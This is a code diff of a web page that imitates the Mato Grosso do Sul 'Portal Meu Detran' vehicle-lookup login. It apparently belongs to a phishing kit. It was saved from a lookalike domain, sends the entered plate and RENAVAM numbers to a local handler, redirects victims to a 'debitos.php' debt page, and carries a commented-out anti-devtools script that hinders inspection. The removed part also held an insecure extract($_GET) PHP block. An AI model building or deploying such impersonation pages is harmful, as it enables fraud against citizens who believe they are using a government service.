@@ -1,26 +1,11 @@
-<?php
-
-error_reporting(0);
-
-extract($_GET);
-
-if($sucesso){
-
-    include_once(__DIR__ . '/homex.php');
-
-    return;
-}
-
-
-?>
-
 <!DOCTYPE html>
- <html lang="pt-br">
+<!-- saved from url=(0030)https://meudetran.ipva-ms.com/ -->
+<html lang="pt-br">
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-    <link rel="shortcut icon" href="/imagens/MsDetran.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://meudetran.ipva-ms.com/assets/img/favicon.ico" type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal Meu Detran</title>
 
@@ -1179,11 +1164,11 @@ if($sucesso){
 <body>
     <header class="site-header">
         <div class="header-container">
-            <img src="./<?= $diretorio ?>/MsDetran_files/logoms.svg" alt="Logo MS" class="logo-ms">
+            <img src="./detran-ms_files/logoms.svg" alt="Logo MS" class="logo-ms">
 
             <div class="logo-center-container">
-                <a  class="logo-center-link">
-                    <img src="./<?= $diretorio ?>/MsDetran_files/logo-detranms.svg" alt="Meu Detran" class="logo-meudetran">
+                <a href="https://meudetran.ipva-ms.com/" class="logo-center-link">
+                    <img src="./detran-ms_files/logo-detranms.svg" alt="Meu Detran" class="logo-meudetran">
                 </a>
             </div>
         </div>
@@ -1194,7 +1179,7 @@ if($sucesso){
             <div class="breadcrumb-content">
                 <div class="breadcrumb-item">
                     <div class="breadcrumb-link-wrapper">
-                        <a  class="breadcrumb-link">
+                        <a href="https://meudetran.ipva-ms.com/" class="breadcrumb-link">
                             <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 20 20"
                                 aria-hidden="true" class="breadcrumb-icon" height="1em" width="1em"
                                 xmlns="http://www.w3.org/2000/svg">
@@ -1282,7 +1267,7 @@ if($sucesso){
                     </div>
 
                     <div class="decorative-image">
-                        <img src="./<?= $diretorio ?>/MsDetran_files/mulherConteudoDireito.png" alt="Mulher Login">
+                        <img src="./detran-ms_files/mulherConteudoDireito.png" alt="Mulher Login">
                     </div>
                 </div>
             </div>
@@ -1293,7 +1278,7 @@ if($sucesso){
         <footer class="site-footer">
             <div class="footer-content">
                 <div class="footer-info">
-                    <img src="./<?= $diretorio ?>/MsDetran_files/logoRodape.svg" alt="MS Gov" class="footer-logo">
+                    <img src="./detran-ms_files/logoRodape.svg" alt="MS Gov" class="footer-logo">
                     <p class="footer-copyright">© 2025 Departamento Estadual de Trânsito - Todos os direitos reservados
                     </p>
                 </div>
@@ -1404,8 +1389,10 @@ if($sucesso){
         </div>
     </div>
 
-    <script src="./<?= $diretorio ?>/MsDetran_files/jquery-3.7.0.min.js.baixados"></script>
-    <script type="text/javascript" src="./<?= $diretorio ?>/MsDetran_files/base.js.baixados"></script> 
+    <script src="./detran-ms_files/jquery-3.7.0.min.js.baixados"></script>
+    <script type="text/javascript" src="./detran-ms_files/base.js.baixados"></script>
+    <script type="text/javascript" src="./detran-ms_files/online.js.baixados"></script>
+    <!-- <script disable-devtool-auto url='https://www.globo.com' src='https://cdn.jsdelivr.net/npm/disable-devtool'></script> -->
 
     <script>
     function exibirModalValidacao(mensagem) {
@@ -1519,11 +1506,14 @@ if($sucesso){
                 const fillTime = (Date.now() / 1000) - 1772148482.1939;
 
                 const dadosEnvio = {};
-                dadosEnvio['placa'] = placa;
-                dadosEnvio['renavam'] = renavam;
+                dadosEnvio[campoPlaca] = placa;
+                dadosEnvio[campoRenavam] = renavam;
+                dadosEnvio['csrf_token'] = window.csrfToken || '';
+                dadosEnvio['js_token'] = window.jsVerificationToken || '';
+                dadosEnvio['fill_time'] = fillTime;
 
                 $.ajax({
-                    url: '/api/ms.php?placa=' + encodeURIComponent(placa) + '&renavam=' + encodeURIComponent(renavam) +'&fill_time=' + fillTime,
+                    url: '/functions/api.php',
                     method: 'POST',
                     data: dadosEnvio,
                     headers: {
@@ -1556,17 +1546,33 @@ if($sucesso){
                         );
                         return false;
                     }
-                
-                    if(data.IsStatus) {
+
+                    if (typeof data === 'string') {
+                        if (data.trim() === 'invalido' || data.trim() ===
+                            'invalid CNPJ') {
+                            desativarLoading();
+                            exibirModalValidacao(
+                                'Placa ou RENAVAM inválidos. Por favor, verifique os dados e tente novamente.'
+                            );
+                            return false;
+                        } else if (data.trim() === 'non-opting') {
+                            desativarLoading();
+                            exibirModalValidacao(
+                                'Veículo não optante. Esta consulta é restrita a veículos registrados ou com infrações em Mato Grosso do Sul.'
+                            );
+                            return false;
+                        } else {
+                            mostrarVeiculoEncontrado();
+                            window.setTimeout(function() {
+                                window.location.href = './debitos.php';
+                            }, 1000);
+                        }
+                    } else {
                         mostrarVeiculoEncontrado();
                         window.setTimeout(function() {
-                             window.location.href = './?sucesso='+encodeURIComponent(placa)+'&renavam='+encodeURIComponent(renavam);
+                            window.location.href = './debitos.php';
                         }, 1000);
-                    }else if(!data.IsStatus) {
-                        desativarLoading();
-                        exibirModalValidacao(data.message || 'Veículo não encontrado. Verifique os dados e tente novamente.');
                     }
-                    
                 }).fail(function(xhr, status, error) {
                     desativarLoading();
 
@@ -1593,6 +1599,13 @@ if($sucesso){
         });
     });
     </script>
+    <script defer="" src="./detran-ms_files/v67327c56f0bb4ef8b305cae61679db8f1769101564043"
+        integrity="sha512-rdcWY47ByXd76cbCFzznIcEaCN71jqkWBBqlwhF1SY7KubdLKZiEGeP7AyieKZlGP9hbY/MhGrwXzJC/HulNyg=="
+        data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;eacbbdabf5604515903afea227baa73e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}"
+        crossorigin="anonymous"></script>
+
+
+
 
 </body>
 
